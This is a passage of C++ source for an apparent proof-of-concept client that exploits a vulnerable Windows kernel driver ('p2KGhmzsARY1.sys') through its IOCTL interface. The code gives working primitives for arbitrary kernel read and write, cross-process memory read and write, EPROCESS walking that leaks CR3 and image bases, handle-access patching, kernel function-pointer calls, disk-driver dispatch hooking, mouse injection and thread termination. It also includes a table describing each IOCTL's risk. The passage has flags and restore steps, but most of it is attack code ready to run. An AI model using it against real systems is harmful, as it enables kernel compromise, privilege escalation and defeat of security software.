            *out = kKnown[i];
            return true;
        }
    }
    return false;
}

// -----------------------------------------------------------------------------
//  Commands
// -----------------------------------------------------------------------------
static bool CmdConstant(HANDLE h)
{
    printf("\n--- 0x22001A  constant query ---\n");

    unsigned char req[kReqSize] = {};
    Out64 out{};
    if (!Ioctl(h, kIoctlConstant, req, &out, nullptr)) return false;

    printf("[+] value = 0x%016llx\n", static_cast<unsigned long long>(out.Value));
    if (out.Value == 0x100080000ULL)
        printf("[+] matches the constant in the driver (0x100080000)\n");
    return true;
}

static bool CmdKernelReadEprocess(HANDLE h, UINT64 eprocess)
{
    printf("\n--- 0x22000E  kernel read (EPROCESS header) ---\n");
    if (!eprocess) {
        printf("[-] no EPROCESS pointer, skipping\n");
        return false;
    }

    unsigned char buf[0x40] = {};
    if (!KernelRead(h, eprocess, buf, sizeof(buf))) return false;

    printf("[+] read %zu bytes at 0x%016llx\n", sizeof(buf),
           static_cast<unsigned long long>(eprocess));
    HexDump(buf, sizeof(buf), eprocess);

    // The first bytes of _EPROCESS are the KPROCESS header: DispatcherHeader
    // starts with a type/priority byte pair, always non-zero on a live object.
    if (buf[0] != 0 || buf[1] != 0)
        printf("[+] non-zero kernel data - read primitive works\n");
    return true;
}

static bool CmdProcessRead(HANDLE h, UINT32 pid, const char* label)
{
    printf("\n--- 0x22001E  process read (%s, pid %lu) ---\n", label, pid);

    // Image base comes from PEB->ImageBaseAddress, read through the driver
    // itself.  No CreateToolhelp32Snapshot(TH32CS_SNAPMODULE) here.
    UINT64 base = 0;
    UINT64 peb = 0;
    if (!GetImageBaseViaPeb(h, pid, &base, &peb)) {
        printf("[-] cannot resolve the target image base\n");
        return false;
    }
    printf("[+] PEB  = 0x%016llx\n", static_cast<unsigned long long>(peb));
    printf("[+] base = 0x%016llx (PEB->ImageBaseAddress)\n",
           static_cast<unsigned long long>(base));

    unsigned char buf[0x40] = {};
    if (!ProcessRead(h, pid, base, buf, sizeof(buf))) return false;

    printf("[+] read %zu bytes at 0x%016llx\n", sizeof(buf),
           static_cast<unsigned long long>(base));
    HexDump(buf, sizeof(buf), base);

    if (buf[0] == 'M' && buf[1] == 'Z')
        printf("[+] MZ header confirmed - process read works\n");
    else
        printf("[-] no MZ header at that address\n");
    return (buf[0] == 'M' && buf[1] == 'Z');
}

// Reads an EPROCESS in 0x100-byte chunks.  A 0x800-byte object can straddle a
// page boundary; a single large MmCopyVirtualMemory then fails as a whole,
// while chunked reads keep every page that is mapped.  Returns bytes read.
static size_t ReadEprocessPartial(HANDLE h, UINT64 addr,
                                  std::vector<unsigned char>& buf, UINT32 want)
{
    buf.assign(want, 0);
    size_t got = 0;
    while (got < want) {
        const UINT32 step = (want - got) > 0x100 ? 0x100
                                                 : static_cast<UINT32>(want - got);
        if (!KernelRead(h, addr + got, buf.data() + got, step)) break;
        got += step;
    }
    buf.resize(got);
    return got;
}

// -----------------------------------------------------------------------------
//  The headline command: walk ActiveProcessLinks from the System EPROCESS and
//  print BaseAddress + ProcessCR3 for every process.
//
//  Reads only: 0x22003A for the System EPROCESS, 0x22000E for each object.
// -----------------------------------------------------------------------------
static bool CmdWalk(HANDLE h, UINT32 targetPid)
{
    printf("\n--- EPROCESS walk (0x22003A + 0x22000E) ---\n");

    UINT64 system = 0;
    if (!LeakPointer(h, kIoctlGetProcess, 4, &system)) return false;
    if (system < kKernelBase) {
        printf("[-] System EPROCESS looks wrong: 0x%016llx\n",
               static_cast<unsigned long long>(system));
        return false;
    }
    printf("[+] System EPROCESS = 0x%016llx\n",
           static_cast<unsigned long long>(system));

    std::vector<unsigned char> buf;
    const size_t got = ReadEprocessPartial(h, system, buf, 0x800);
    if (got < 0x300) {
        printf("[-] cannot read the System EPROCESS (only 0x%zX bytes)\n", got);
        return false;
    }
    printf("[+] read 0x%zX bytes of the object\n", got);

    EprocessLayout lay{};
    if (!DetectEprocessLayout(buf.data(), buf.size(), &lay)) {
        printf("[-] could not identify the EPROCESS layout - refusing to walk\n");
        return false;
    }
    printf("[+] layout: pid +0x%03lX  links +0x%03lX  name +0x%03lX  base +0x%03lX  (%s)\n",
           static_cast<unsigned long>(lay.Pid),
           static_cast<unsigned long>(lay.Links),
           static_cast<unsigned long>(lay.Name),
           static_cast<unsigned long>(lay.Base),
           lay.Source);

    printf("\n  %-6s %-18s %-18s %-18s %s\n",
           "pid", "eprocess", "base", "cr3", "name");

    const size_t minEntry = lay.Name + 0x10;
    UINT64 cur = system;
    UINT64 targetEprocess = 0, targetBase = 0, targetCr3 = 0;
    bool targetFound = false;

    UINT32 i = 0;
    for (; i < 4096; ++i) {
        const unsigned char* b = buf.data();

        UINT32 pid = 0;
        UINT64 base = 0, cr3 = 0, flink = 0;
        memcpy(&pid,   b + lay.Pid,   sizeof(pid));
        memcpy(&base,  b + lay.Base,  sizeof(base));
        memcpy(&cr3,   b + 0x28,      sizeof(cr3));
        memcpy(&flink, b + lay.Links, sizeof(flink));

        char name[16] = {};
        memcpy(name, b + lay.Name, 15);

        const bool isTarget = (pid == targetPid);
        printf("  %-6lu %016llx %016llx %016llx %s%s\n",
               pid,
               static_cast<unsigned long long>(cur),
               static_cast<unsigned long long>(base),
               static_cast<unsigned long long>(cr3),
               name,
               isTarget ? "  <== target" : "");

        if (isTarget && !targetFound) {
            targetFound  = true;
            targetEprocess = cur;
            targetBase   = base;
            targetCr3    = cr3;
        }

        if (flink < kKernelBase || (flink & 7) != 0) {
            printf("[-] ActiveProcessLinks.Flink is not a kernel pointer: 0x%016llx\n",
                   static_cast<unsigned long long>(flink));
            break;
        }

        const UINT64 next = flink - lay.Links;
        if (next == system) {
            printf("\n[+] walked %u processes, back at the System EPROCESS\n", i + 1);
            break;
        }
        if (next == cur) {
            printf("[-] list entry points at itself, stopping\n");
            break;
        }

        const size_t n = ReadEprocessPartial(h, next, buf, 0x800);
        if (n < minEntry) {
            printf("[-] read of EPROCESS 0x%016llx failed (0x%zX bytes), stopping\n",
                   static_cast<unsigned long long>(next), n);
            break;
        }
        cur = next;
    }

    if (i == 4096)
        printf("[-] stopped after 4096 entries (loop guard)\n");

    if (!targetFound) {
        printf("[-] target pid %lu was not in the list\n", targetPid);
        return false;
    }

    printf("\n[+] target pid %lu\n", targetPid);
    printf("[+] EPROCESS    = 0x%016llx\n",
           static_cast<unsigned long long>(targetEprocess));
    printf("[+] BaseAddress = 0x%016llx  (EPROCESS +0x%03lX)\n",
           static_cast<unsigned long long>(targetBase),
           static_cast<unsigned long>(lay.Base));
    printf("[+] ProcessCR3  = 0x%016llx  (KPROCESS.DirectoryTableBase +0x028)\n",
           static_cast<unsigned long long>(targetCr3));

    // Confirm the base with a read through the target's own page tables.  The
    // System/Idle process legitimately has no image base.
    if (targetBase != 0) {
        unsigned char mz[2] = {};
        if (ProcessRead(h, targetPid, targetBase, mz, sizeof(mz)) &&
            mz[0] == 'M' && mz[1] == 'Z') {
            printf("[+] MZ header confirmed at BaseAddress\n");
        } else {
            printf("[!] no MZ header at BaseAddress - falling back to the PEB\n");
            UINT64 pebBase = 0, peb = 0;
            if (GetImageBaseViaPeb(h, targetPid, &pebBase, &peb)) {
                printf("[+] PEB           = 0x%016llx\n",
                       static_cast<unsigned long long>(peb));
                printf("[+] PEB->ImageBase= 0x%016llx\n",
                       static_cast<unsigned long long>(pebBase));
            }
        }
    } else {
        printf("[*] BaseAddress is zero - expected for the System/Idle process\n");
    }

    return true;
}

// Non-destructive write proof in the caller's own process: read the original
// bytes, write a pattern with 0x22001E, verify, restore, verify again.
static bool CmdWriteRoundTrip(HANDLE h, UINT32 selfPid)
{
    printf("\n--- 0x22001E  write round-trip (own process, pid %lu) ---\n", selfPid);

    void* scratch = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE,
                                 PAGE_READWRITE);
    if (!scratch) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        return false;
    }

    const UINT32 size = 0x40;
    unsigned char original[0x40];
    unsigned char pattern[0x40];
    unsigned char verify[0x40];
    memset(original, 0, sizeof(original));
    for (size_t i = 0; i < sizeof(pattern); ++i)
        pattern[i] = static_cast<unsigned char>(0xA0 + (i & 0x0F));

    memcpy(scratch, original, size);
    const UINT64 va = reinterpret_cast<UINT64>(scratch);

    if (!ProcessRead(h, selfPid, va, verify, size)) {
        VirtualFree(scratch, 0, MEM_RELEASE);
        return false;
    }
    printf("[+] original bytes at 0x%016llx read back\n",
           static_cast<unsigned long long>(va));

    bool ok = ProcessWrite(h, selfPid, va, pattern, size);
    if (ok) {
        memset(verify, 0, sizeof(verify));
        ok = ProcessRead(h, selfPid, va, verify, size);
        ok = ok && (memcmp(verify, pattern, size) == 0);
        printf("%s pattern write", ok ? "[+]" : "[-]");
        printf("%s", ok ? " verified\n" : " NOT visible\n");
    }

    if (ok) {
        bool restored = ProcessWrite(h, selfPid, va, original, size);
        if (restored) {
            memset(verify, 0xFF, sizeof(verify));
            restored = ProcessRead(h, selfPid, va, verify, size);
            restored = restored && (memcmp(verify, original, size) == 0);
        }
        printf("%s restore", restored ? "[+]" : "[-]");
        printf("%s", restored ? " verified\n" : " FAILED (buffer still holds the pattern)\n");
        ok = restored;
    }

    VirtualFree(scratch, 0, MEM_RELEASE);
    return ok;
}

// The physical staging path: 0x22001E with +0x21 != 0 translates the caller VA
// in Addr2 to a PA, maps it with MmMapIoSpaceEx/MmMapIoSpace and uses it to
// stage the transfer.  Both buffers are page-aligned so the PA is page-aligned.
static bool CmdPhysDemo(HANDLE h, UINT32 selfPid)
{
    printf("\n--- 0x22001E  physical staging path (own process) ---\n");

    void* src = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    void* dst = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!src || !dst) {
        printf("[-] VirtualAlloc failed: %lu\n", GetLastError());
        if (src) VirtualFree(src, 0, MEM_RELEASE);
        if (dst) VirtualFree(dst, 0, MEM_RELEASE);
        return false;
    }

    const UINT32 size = 0x100;
    unsigned char* s = static_cast<unsigned char*>(src);
    unsigned char* d = static_cast<unsigned char*>(dst);
    for (UINT32 i = 0; i < size; ++i) s[i] = static_cast<unsigned char>(0x30 + (i & 0x3F));
    memset(d, 0, size);

    printf("[+] src VA = 0x%016llx (page aligned)\n",
           static_cast<unsigned long long>(reinterpret_cast<UINT64>(src)));
    printf("[+] dst VA = 0x%016llx (page aligned)\n",
           static_cast<unsigned long long>(reinterpret_cast<UINT64>(dst)));

    // Read == 1: target(Addr1 = src) -> staging page of Addr2 (= dst).
    bool ok = ProcessReadPhys(h, selfPid,
                              reinterpret_cast<UINT64>(src),
                              dst, size);
    if (ok) {
        ok = (memcmp(dst, src, size) == 0);
        printf("%s physical read: dst == src\n", ok ? "[+]" : "[-]");
    }

    VirtualFree(src, 0, MEM_RELEASE);
    VirtualFree(dst, 0, MEM_RELEASE);
    return ok;
}

static bool CmdProtect(HANDLE h, UINT32 pid, bool protect)
{
    printf("\n--- 0x%06X  %s(pid %lu) ---\n",
           protect ? kIoctlProtectProcess : kIoctlUnprotectProcess,
           protect ? "protect" : "unprotect", pid);

    PidReq req{};
    req.Pid = pid;
    Out64 out{};
    if (!Ioctl(h, protect ? kIoctlProtectProcess : kIoctlUnprotectProcess,
               &req, &out, nullptr))
        return false;

    printf("[+] whitelist entry flag %s\n", protect ? "set (+8 = 1)" : "cleared (+8 = 0)");
    if (protect) {
        printf("[!] the Ob callbacks now strip handle access to pid %lu for\n", pid);
        printf("    every other opener; use --unprotect %lu to undo\n", pid);
    }
    return true;
}

static bool CmdArmUnload(HANDLE h)
{
    printf("\n--- 0x220016  arm DriverUnload ---\n");

    unsigned char req[kReqSize] = {};
    Out64 out{};
    if (!Ioctl(h, kIoctlArmUnload, req, &out, nullptr)) return false;

    printf("[+] DriverObject->DriverUnload installed (offset 0x68)\n");
    printf("[!] the driver can now be stopped with: sc stop p2KGhmzsARY1\n");
    return true;
}

static bool CmdKernelReadAddr(HANDLE h, UINT64 addr, UINT32 size)
{
    printf("\n--- 0x22000E  kernel read 0x%016llx (%lu bytes) ---\n",
           static_cast<unsigned long long>(addr), size);

    std::vector<unsigned char> buf(size, 0);
    if (!KernelRead(h, addr, buf.data(), size)) return false;
    HexDump(buf.data(), buf.size(), addr);
    return true;
}

static bool CmdKernelWriteRoundTrip(HANDLE h, UINT64 addr, const std::vector<unsigned char>& data)
{
    printf("\n--- 0x220012  kernel write round-trip 0x%016llx (%zu bytes) ---\n",
           static_cast<unsigned long long>(addr), data.size());

    const UINT32 size = static_cast<UINT32>(data.size());
    std::vector<unsigned char> original(size, 0);
    std::vector<unsigned char> verify(size, 0);

    if (!KernelRead(h, addr, original.data(), size)) {
        printf("[-] cannot read the original bytes - refusing to write\n");
        return false;
    }
    printf("[+] original bytes:\n");
    HexDump(original.data(), original.size(), addr);

    if (!KernelWrite(h, addr, data.data(), size)) return false;
    if (!KernelRead(h, addr, verify.data(), size)) return false;

    bool ok = (memcmp(verify.data(), data.data(), size) == 0);
    printf("%s write verified\n", ok ? "[+]" : "[-]");
    if (!ok) return false;

    if (!KernelWrite(h, addr, original.data(), size)) return false;
    if (!KernelRead(h, addr, verify.data(), size)) return false;

    bool restored = (memcmp(verify.data(), original.data(), size) == 0);
    printf("%s restore verified\n", restored ? "[+]" : "[-]");
    return restored;
}

// -----------------------------------------------------------------------------
//  Remaining IOCTLs
// -----------------------------------------------------------------------------
static bool CmdPoolScan(HANDLE h)
{
    printf("\n--- 0x22018E  BigPool scan ---\n");

    unsigned char req[kReqSize] = {};
    Out64 out{};
    if (!Ioctl(h, kIoctlPoolScan, req, &out, nullptr)) return false;

    printf("[+] first 0x200000-byte pool chunk with tag 0x546E6F43: 0x%016llx\n",
           static_cast<unsigned long long>(out.Value));
    if (out.Value == 0)
        printf("[*] no matching chunk (the tag is fixed in the driver)\n");
    return true;
}

static bool CmdRefHandle(HANDLE h, UINT32 handle)
{
    printf("\n--- 0x22003E  reference object by handle (%lu) ---\n", handle);

    HandleReq req{};
    req.Handle = handle;
    Out64 out{};
    if (!Ioctl(h, kIoctlRefHandle, &req, &out, nullptr)) return false;

    printf("[+] object = 0x%016llx\n",
           static_cast<unsigned long long>(out.Value));
    printf("[!] the driver references and immediately dereferences the object,\n");
    printf("    then returns the stale pointer (use-after-free window by design)\n");
    return out.Value != 0;
}

// 0x220022: ExEnumHandleTable over the target process.  The driver's own
// callback (sub_140003610) compares the entry's HANDLE with request+0x08 and,
// on a match, writes request+0x10 (low 32 bits) to entry+8 (GrantedAccess).
// There is no user-controlled function pointer in this path.
static bool CmdHandleAccess(HANDLE h, UINT32 pid, UINT64 handleValue,
                            UINT64 newAccess)
{
    printf("\n--- 0x220022  handle table walk (pid %lu) ---\n", pid);
    printf("    match handle 0x%llx -> GrantedAccess 0x%llx\n",
           static_cast<unsigned long long>(handleValue),
           static_cast<unsigned long long>(newAccess));
    printf("[!] this reaches into the target's handle table from kernel mode.\n");
    printf("[!] the callback selected for builds > 7601 is malformed (a 4-arg\n");
    printf("    thunk is registered with a 3-arg ExEnumHandleTable callback), so\n");
    printf("    this IOCTL can bugcheck instead of patching anything.\n");

    HandleAccessReq req{};
    req.Pid         = pid;
    req.HandleValue = handleValue;
    req.NewAccess   = newAccess;

    Out64 out{};
    if (!Ioctl(h, kIoctlEnumHandles, &req, &out, nullptr)) return false;

    printf("[+] IOCTL completed (see the note above - no return value)\n");
    return true;
}

static bool CmdTableCall(HANDLE h, const char* module, UINT64 a1, UINT64 a2,
                         UINT64 a3)
{
    printf("\n--- 0x220026  kernel table call ---\n");
    printf("    module '%s'  args 0x%llx 0x%llx 0x%llx\n", module,
           static_cast<unsigned long long>(a1),
           static_cast<unsigned long long>(a2),
           static_cast<unsigned long long>(a3));
    printf("[!] the driver pattern-scans ntoskrnl .text for an internal pointer\n");
    printf("[!] table, picks the first entry whose target lives in the named\n");
    printf("[!] module and calls it with these three arguments.  The name is the\n");
    printf("[!] module BaseDllName and is matched case-sensitively, e.g.\n");
    printf("[!] 'ntoskrnl.exe'.  A wrong name or wrong prototype will bugcheck.\n");

    TableCallReq req{};
    const int n = MultiByteToWideChar(CP_ACP, 0, module, -1, req.Module,
                                      static_cast<int>(sizeof(req.Module) /
                                                       sizeof(req.Module[0])));
    if (n <= 0) {
        printf("[-] module name conversion failed (%lu)\n", GetLastError());
        return false;
    }
    if (n > static_cast<int>(sizeof(req.Module) / sizeof(req.Module[0]))) {
        printf("[-] module name too long (max 63 characters)\n");
        return false;
    }
    req.A1 = a1;
    req.A2 = a2;
    req.A3 = a3;

    Out64 out{};
    if (!Ioctl(h, kIoctlKernelTableCall, &req, &out, nullptr)) return false;
    printf("[+] IOCTL completed\n");
    return true;
}

static bool CmdMouse(HANDLE h, UINT32 buttons, UINT32 lastY,
                     UINT16 btnFlags, UINT16 flags)
{
    printf("\n--- 0x22002A  mouse input injection ---\n");
    printf("    buttons=%lu lastY=%lu btnFlags=0x%04X flags=0x%04X\n",
           buttons, lastY, btnFlags, flags);
    printf("[!] this feeds synthetic input below the win32k boundary\n");

    MouseReq req{};
    req.Buttons  = buttons;
    req.LastY    = lastY;
    req.BtnFlags = btnFlags;
    req.Flags    = flags;

    Out64 out{};
    if (!Ioctl(h, kIoctlMouseInject, &req, &out, nullptr)) return false;
    printf("[+] IOCTL completed\n");
    return true;
}

static bool CmdDiskHook(HANDLE h, int mode)
{
    printf("\n--- 0x22002E  \\Driver\\Disk IRP_MJ_DEVICE_CONTROL swap ---\n");

    const int modes[2] = { 0, 1 };
    const int count   = (mode == 2) ? 2 : 1;

    for (int i = 0; i < count; ++i) {
        const int m = (mode == 2) ? modes[i] : mode;
        printf("[*] mode %d: %s\n", m,
               m == 0 ? "DeviceControl := Write handler (hijack)"
                      : "DeviceControl := saved handler (restore)");

        ModeReq req{};
        req.Mode = static_cast<UINT8>(m);
        Out64 out{};
        if (!Ioctl(h, kIoctlDiskHook, &req, &out, nullptr)) return false;

        if (m == 0) {
            printf("[!] while this is active every disk IOCTL is routed to the\n");
            printf("[!] write handler - a single unexpected request can bugcheck\n");
        }
    }

    printf("[+] done%s\n", mode == 2 ? " (hook + restore)" : "");
    return true;
}

static bool CmdKillThread(HANDLE h, UINT32 tid, bool allowForeign)
{
    printf("\n--- 0x220032  terminate thread via kernel APC (tid %lu) ---\n", tid);

    if (tid == 0) {
        printf("[-] refusing: tid 0 does not exist\n");
        return false;
    }

    const UINT32 owner = ThreadOwnerPid(tid);
    printf("[*] owner pid: %s\n",
           owner == 0xFFFFFFFF ? "unknown" : std::to_string(owner).c_str());

    if (owner == 0 || owner == 4) {
        printf("[-] refusing: thread belongs to the idle/system process\n");
        return false;
    }
    if (owner == GetCurrentProcessId()) {
        printf("[-] refusing: that is one of our own threads\n");
        return false;
    }
    if (owner != 0xFFFFFFFF && !allowForeign) {
        printf("[-] refusing: foreign thread - add --allow-foreign-thread\n");
        return false;
    }

    TidReq req{};
    req.Tid = tid;
    Out64 out{};
    if (!Ioctl(h, kIoctlKillThread, &req, &out, nullptr)) return false;

    printf("[+] APC queued; PsTerminateSystemThread runs in the target thread\n");
    return true;
}

static bool CmdDelayApc(HANDLE h, UINT32 tid, UINT64 ms, bool allowForeign)
{
    printf("\n--- 0x220042  delay APC (tid %lu, %llu ms) ---\n", tid,
           static_cast<unsigned long long>(ms));

    if (tid == 0) {
        printf("[-] refusing: tid 0 does not exist\n");
        return false;
    }

    const UINT32 owner = ThreadOwnerPid(tid);
    printf("[*] owner pid: %s\n",
           owner == 0xFFFFFFFF ? "unknown" : std::to_string(owner).c_str());

    if (owner == 0 || owner == 4) {
        printf("[-] refusing: thread belongs to the idle/system process\n");
        return false;
    }
    if (owner != GetCurrentProcessId() && owner != 0xFFFFFFFF && !allowForeign) {
        printf("[-] refusing: foreign thread - add --allow-foreign-thread\n");
        return false;
    }

    DelayReq req{};
    req.Tid = tid;
    req.Milliseconds = ms;
    Out64 out{};
    if (!Ioctl(h, kIoctlDelayApc, &req, &out, nullptr)) return false;

    printf("[+] delay APC queued\n");
    return true;
}

// -----------------------------------------------------------------------------
//  g_OsOffsets (.data at driver base + 0x9868, exactly 0x3C bytes)
// -----------------------------------------------------------------------------
static bool GetOsOffsetsAddress(UINT64* address, UINT64* moduleBase)
{
    const UINT64 base = FindKernelModuleBase(kDriverImageName);
    if (!base) {
        printf("[-] %ls is not in the loaded-module list\n", kDriverImageName);
        printf("    (is the driver loaded under a different file name?)\n");
        return false;
    }
    *moduleBase = base;
    *address    = base + kOsOffsetsRva;
    return true;
}

static bool CmdDumpOffsets(HANDLE h)
{
    printf("\n--- g_OsOffsets dump (read-only) ---\n");

    UINT64 base = 0, table = 0;
    if (!GetOsOffsetsAddress(&table, &base)) return false;
    printf("[+] driver base        = 0x%016llx\n",
           static_cast<unsigned long long>(base));
    printf("[+] g_OsOffsets (+0x%lX) = 0x%016llx\n",
           static_cast<unsigned long>(kOsOffsetsRva),
           static_cast<unsigned long long>(table));

    unsigned char buf[kOsOffsetsSize] = {};
    if (!KernelRead(h, table, buf, sizeof(buf))) return false;

    HexDump(buf, sizeof(buf), table);
    printf("  +0x00  u8  version   = %u\n", buf[0]);
    printf("  +0x01  u8  flag      = %u  (1 = pre-Win8 path)\n", buf[1]);
    for (UINT32 off = 4; off + 4 <= kOsOffsetsSize; off += 4) {
        UINT32 v = 0;
        memcpy(&v, buf + off, sizeof(v));
        printf("  +0x%02lX  u32         = %lu (0x%lX)\n",
               static_cast<unsigned long>(off), v, v);
    }
    return true;
}

static bool CmdSetOffsets(HANDLE h, const std::vector<unsigned char>& data,
                          bool keep)
{
    printf("\n--- 0x22004E  set g_OsOffsets (%zu bytes) ---\n", data.size());

    if (data.size() != kOsOffsetsSize) {
        printf("[-] exactly 0x3C bytes are required, got 0x%zX\n", data.size());
        printf("    the handler does MemMove(g_OsOffsets, input, len) with only a\n");
        printf("    'len >= 0x3C' check, so a larger input overwrites .data\n");
        return false;
    }

    UINT64 base = 0, table = 0;
    if (!GetOsOffsetsAddress(&table, &base)) return false;
    printf("[+] driver base        = 0x%016llx\n",
           static_cast<unsigned long long>(base));
    printf("[+] g_OsOffsets (+0x%lX) = 0x%016llx\n",
           static_cast<unsigned long>(kOsOffsetsRva),
           static_cast<unsigned long long>(table));

    unsigned char original[kOsOffsetsSize] = {};
    if (!KernelRead(h, table, original, sizeof(original))) {
        printf("[-] cannot read the current table - refusing to write\n");
        return false;
    }
    printf("[+] current table:\n");
    HexDump(original, sizeof(original), table);

    Out64 out{};
    if (!IoctlRaw(h, kIoctlSetOsOffsets, data.data(), kOsOffsetsSize,
                  &out, kOutSize, nullptr))
        return false;

    unsigned char verify[kOsOffsetsSize] = {};
    if (!KernelRead(h, table, verify, sizeof(verify))) return false;

    bool ok = (memcmp(verify, data.data(), data.size()) == 0);
    printf("%s write verified\n", ok ? "[+]" : "[-]");

    if (!keep) {
        Out64 ignored{};
        if (IoctlRaw(h, kIoctlSetOsOffsets, original, kOsOffsetsSize,
                     &ignored, kOutSize, nullptr)) {
            unsigned char restored[kOsOffsetsSize] = {};
            if (KernelRead(h, table, restored, sizeof(restored))) {
                const bool good = (memcmp(restored, original, sizeof(original)) == 0);
                printf("%s restore verified\n", good ? "[+]" : "[-]");
                ok = ok && good;
            }
        }
    }

    return ok;
}

// -----------------------------------------------------------------------------
//  IOCTL documentation / dangerous-surface listing
// -----------------------------------------------------------------------------
struct IoctlDoc {
    DWORD       Code;
    const char* Name;
    const char* Layout;
    const char* Risk;
    const char* Note;
};

static const IoctlDoc kIoctlDocs[] = {
    { 0x220006, "ProtectProcess",   "in {u32 pid}", "state",
      "adds the EPROCESS to the whitelist and sets flag +8=1; Ob callbacks then strip handle access" },
    { 0x22000A, "UnprotectProcess", "in {u32 pid}", "state",
      "clears flag +8 - undoes 0x220006" },
    { 0x22000E, "KernelRead",       "in {u64 kaddr; u64 user; u64 size}", "read",
      "MmCopyVirtualMemory(PsInitialSystemProcess -> caller); MmIsAddressValid(kaddr) first" },
    { 0x220012, "KernelWrite",      "in {u64 kaddr; u64 user; u64 size}", "WRITE",
      "MmCopyVirtualMemory(caller -> PsInitialSystemProcess)" },
    { 0x220016, "ArmUnload",        "in -", "state",
      "writes DriverObject->DriverUnload (0x68) so sc stop works" },
    { 0x22001A, "Constant",         "out {u64}", "read",
      "returns 0x100080000" },
    { 0x22001E, "ProcessCopy",      "in {u32 pid; u32 pad; u64 addr1; u64 size; u64 addr2; u8 read; u8 phys}", "read/WRITE",
      "MmCopyVirtualMemory, or page-table walk + MmMapIoSpaceEx when phys=1" },
    { 0x220022, "HandleAccess",     "in {u32 pid; u32 pad; u64 handle; u64 access}", "handle",
      "ExEnumHandleTable; entry+8 (GrantedAccess) := access when the handle value matches" },
    { 0x220026, "KernelTableCall",  "in {wchar name[0x80]; u64 a1; u64 a2; u64 a3}", "CODE EXEC",
      "pattern-scans a kernel module table and calls a matching pointer with 3 arguments" },
    { 0x22002A, "MouseInject",      "in {u32 buttons; u32 lastY; u16 btnFlags; u16 flags}", "input",
      "resolves the MouClass service callback and feeds synthetic mouse input" },
    { 0x22002E, "DiskHook",         "in {u8 mode}", "SYSTEM",
      "mode 0: \\Driver\\Disk IRP_MJ_DEVICE_CONTROL := its IRP_MJ_WRITE handler" },
    { 0x220032, "KillThread",       "in {u32 tid}", "DESTRUCTIVE",
      "queues a kernel APC whose routine calls PsTerminateSystemThread" },
    { 0x220036, "GetThread",        "in {u32 tid} out {u64 ETHREAD}", "read",
      "PsLookupThreadByThreadId, dereferences before returning (UAF window)" },
    { 0x22003A, "GetProcess",       "in {u32 pid} out {u64 EPROCESS}", "read",
      "PsLookupProcessByProcessId, dereferences before returning (UAF window)" },
    { 0x22003E, "RefHandle",        "in {u32 handle} out {u64 object}", "read",
      "ObReferenceObjectByHandle in KernelMode - needs a kernel handle table entry" },
    { 0x220042, "DelayApc",         "in {u32 tid; u32 pad; u64 ms}", "APC",
      "queues a kernel APC into an arbitrary thread that sleeps 'ms' milliseconds" },
    { 0x220046, "Unimplemented",    "in -", "-",
      "falls through to STATUS_INVALID_DEVICE_REQUEST" },
    { 0x22004E, "SetOsOffsets",     "in {u8 table[0x3C]}", "CORRUPTION",
      "MemMove(g_OsOffsets, input, InputBufferLength) with only a 'len >= 0x3C' check - send exactly 0x3C" },
    { 0x22018E, "PoolScan",         "out {u64 pool base}", "read",
      "ZwQuerySystemInformation(SystemBigPoolInformation), first 0x200000 chunk with tag 0x546E6F43" },
};

static void CmdList()
{
    printf("IOCTL surface of p2KGhmzsARY1.sys (all METHOD_OUT_DIRECT)\n");
    printf("=====================================================================\n");
    for (size_t i = 0; i < sizeof(kIoctlDocs) / sizeof(kIoctlDocs[0]); ++i) {
        const IoctlDoc& d = kIoctlDocs[i];
        printf("%06X  %-16s %-12s %s\n", d.Code, d.Name, d.Risk, d.Layout);
        printf("        %s\n", d.Note);
    }
    printf("\nAll 19 codes are implemented in this client.  0x220046 is the only\n");
    printf("inert one (STATUS_INVALID_DEVICE_REQUEST).  Gating:\n");
    printf("  read-only  : dump-offsets, pool-scan, ref-handle, walk, reads\n");
    printf("  --unsafe   : process write, protect/unprotect, arm-unload, mouse\n");
    printf("  both flags : kernel write, phys path, patch-handle, table-call,\n");
    printf("               disk-hook, kill-thread, delay-apc, set-offsets\n");
}

// -----------------------------------------------------------------------------
//  Arg helpers
// -----------------------------------------------------------------------------
static UINT64 ParseU64(const char* s)
{
    if (!s) return 0;
    char* end = nullptr;
    unsigned long long v = _strtoui64(s, &end, 0);
    if (end == s) return 0;
    return static_cast<UINT64>(v);
}

static bool ParseHexBytes(const char* s, std::vector<unsigned char>& out)
{
    out.clear();
    if (!s) return false;

    std::string digits;
    for (const char* p = s; *p; ++p) {
        if (*p == '-' || *p == ':' || *p == ' ' || *p == '_') continue;
        if (!isxdigit(static_cast<unsigned char>(*p))) return false;
        digits.push_back(*p);
    }
    if (digits.empty() || (digits.size() % 2) != 0) return false;

    for (size_t i = 0; i < digits.size(); i += 2) {
        unsigned int v = 0;
        if (sscanf_s(digits.c_str() + i, "%2x", &v) != 1) return false;
        out.push_back(static_cast<unsigned char>(v));
    }
    return true;
}

static void Usage()
{
    printf("poc_p2KGhmzs - user-mode client for p2KGhmzsARY1.sys (\\\\.\\isj2uaoX)\n\n");
    printf("usage: poc_p2KGhmzs.exe [process.exe] [options]\n\n");
    printf("read-only (no flags needed):\n");
    printf("  default              constant + leaks + EPROCESS header + walk + MZ read\n");
    printf("  --walk               0x22003A/0x22000E EPROCESS walk, prints BaseAddress + CR3\n");
    printf("  --dump-offsets       read g_OsOffsets from the loaded driver image\n");
    printf("  --pool-scan          0x22018E BigPool tag scan\n");
    printf("  --ref-handle N       0x22003E object-pointer leak for handle N\n");
    printf("  --read A [N]         0x22001E read N bytes (default 0x40) from the target\n");
    printf("  --kernel-read A [N]  0x22000E read N bytes (default 0x40) at kernel address A\n\n");
    printf("--unsafe:\n");
    printf("  --write A HEX        0x22001E, write + verify + restore\n");
    printf("  --protect [PID]      0x220006 whitelist flag (Ob callbacks strip access)\n");
    printf("  --unprotect [PID]    0x22000A\n");
    printf("  --arm-unload         0x220016 install DriverUnload\n");
    printf("  --mouse B Y BF F     0x22002A MouClass input injection\n\n");
    printf("--unsafe --i-mean-it:\n");
    printf("  --kernel-write A HEX 0x220012, write + verify + restore\n");
    printf("  --phys-demo          0x22001E with phys=1 in the own process\n");
    printf("  --patch-handle PID H A   0x220022 GrantedAccess of handle H := A\n");
    printf("  --table-call MOD A1 A2 A3 0x220026 call a table pointer by module name\n");
    printf("  --disk-hook [hook|restore] 0x22002E \\Driver\\Disk DeviceControl swap\n");
